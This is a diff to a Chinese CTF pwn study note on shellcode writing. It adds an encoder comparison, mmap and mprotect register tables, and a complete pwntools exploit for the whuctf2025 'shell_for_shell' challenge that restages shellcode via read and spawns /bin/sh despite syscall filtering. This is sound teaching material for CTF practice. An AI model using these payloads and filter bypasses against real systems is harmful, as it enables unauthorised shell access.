@@ -6,7 +6,7 @@
 
 要做shellcode，认为有下面几点要解决：
 
-- 一般情况下需要相应内存块至少有可执行权限，如果没有的话看看有没有`mprotect`函数，可以进行一个权限申请
+- 一般情况下需要相应内存块至少有可执行权限，如果没有的话看看有没有`mprotect`函数或者`mmap`函数，可以对指定内存区域申请权限
 - 需要知道写入地址，或者让寄存器指向写入的代码块
 
 ### 直接pwntools生成
@@ -52,7 +52,7 @@ cdq
 syscall
 ```
 
-总长度为22（0x16)字节，实现的是`execve('/bin/sh','sh',0)`，构造出来的条件是这样的：
+总长度为22（0x16)字节，实现的是`execve('/bin/sh',{'sh'},0)`，构造出来的条件是这样的：
 
 - rax:0x3b
 - rdi:’/bin/sh’
@@ -288,7 +288,71 @@ payload = shellcode+b'/bin/sh\x00'
 
 一般是**坏字符（\x00)**,**syscall过滤（\x05\x0f)**,**可见字符**
 
-可见字符和syscall过滤前面已经说过了
+可见字符前面已经说过了，利用alpha3和ae64进行编码，这边优劣如下
+
+|                               | ae64 | [alpha3](https://github.com/SkyLined/alpha3) |
+| ----------------------------- | ---- | -------------------------------------------- |
+| x32位编码为可见字符           | ❌    | ✔                                            |
+| x64位编码位可见字符           | ✔    | ✔                                            |
+| 原shellcode是否可以包含零字节 | ✔    | ❌                                            |
+| 基址寄存器是否可以包含偏移量  | ✔    | ❌                                            |
+
+**syscall过滤**
+
+其中一种方法上面已经介绍过了，使用自改变shellcode。如果可操作空间够大的话，还可以尝试read重新读入shellcode
+
+具体过程就是：布置栈帧，调用read->利用read将shellcode读入指定地点->实现getshell
+
+依旧用whuctf2025的shell_for_shell举例，这里可见powchan的exp:
+
+```python
+shellcode = """
+	mov rbp, 0x404500
+    mov rsp, rbp
+    lea r15, [rip+0xe00]
+    sub r15, 0xe16
+    mov rdi, r15
+    mov rsi, 0x1000
+    mov rdx, 0x7
+    mov rax, 0x401070
+    call rax
+    mov rsi, r15
+    add rsi, 0x86
+    mov rdi, 0
+    mov rdx, 0x100
+    mov rax, 0x401050
+    call rax
+    /* push syscall number */
+    push 0x68
+    mov rax, 0x732f2f2f6e69622f
+    push rax
+    mov rdi, rsp
+    /* push argument array ['sh\x00'] */
+    /* push b'sh\x00' */
+    push 0x1010101 ^ 0x6873
+    xor dword ptr [rsp], 0x1010101
+    xor esi, esi /* 0 */
+    push rsi /* null terminate */
+    push 8
+    pop rsi
+    add rsi, rsp
+    push rsi /* 'sh\x00' */
+    mov rsi, rsp
+    xor edx, edx /* 0 */
+    /* call execve() */
+    push SYS_execve /* 0x3b */
+    pop rax
+    
+"""
+payload = b"\x00\xc0"+asm(shellcode)
+print(payload)
+io.send(payload)
+pause()
+io.send(asm("syscall"))
+io.interactive()
+```
+
+**坏字符**
 
 坏字符过滤的话可以直接去[这里](https://shell-storm.org/shellcode/index.html)找不含\x00的shellcode
 
@@ -350,6 +414,19 @@ b"Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7
   | addr | rdi        | 内存起始地址          |
   | len  | rsi        | 处理的长度            |
   | proc | rdx        | 保护（1为r,2为w,4为x) |
+
+- 利用mmap类函数申请开辟特定权限的空间
+
+  `void *mmap(void *start, size_t length, int prot, int flags, int fd, off_t offset)`
+
+  | 参数   | 对应寄存器 | 作用                               |
+  | ------ | ---------- | ---------------------------------- |
+  | start  | rdi        | 开始地址，0表示系统指定            |
+  | length | rsi        | 映射区长度，不足一页按照一页来处理 |
+  | prot   | rdx        | 保护标志，同上                     |
+  | flags  | r10        | 映射对象的类型，一般设置22         |
+  | fd     | r8         | 文件描述符，设置-1就可以           |
+  | offset | r9         | 被映射对象内容的起点               |
 
 ## seccomp绕过
 
@@ -460,10 +537,10 @@ b'H\xc7\xc0flagPH1\xffH\x83\xefdH\x89\xe6j\x00j\x00j\x00H\x89\xe2I\xc7\xc2\x18\x
 ## Tips
 
 - 有些题目对shellcode的检查可能用到了strlen或别的什么str类型函数，这个时候可以直接在shellcode前加一个\x00起手的指令，绕过判断
-
 - 在无法获取shellcode运行地址时，可以运行syscall，运行后，rcx会被改写为下一条指令的地址
 
   - 在32位程序中，还可以通过call指令获取将运行地址压入栈中
   - 在64位地址中，可以直接通过 `lea rax, [rip]` 来获取rip地址
 
-  
+- 有些时候如果开启了PIE、ASLR保护，地址未知，可以尝试泄露fs寄存器中的值，可以见[这篇](https://powchan.github.io/2025/03/31/WHUCTF2025-pwn-wp/#shell-for-another-shell)
+
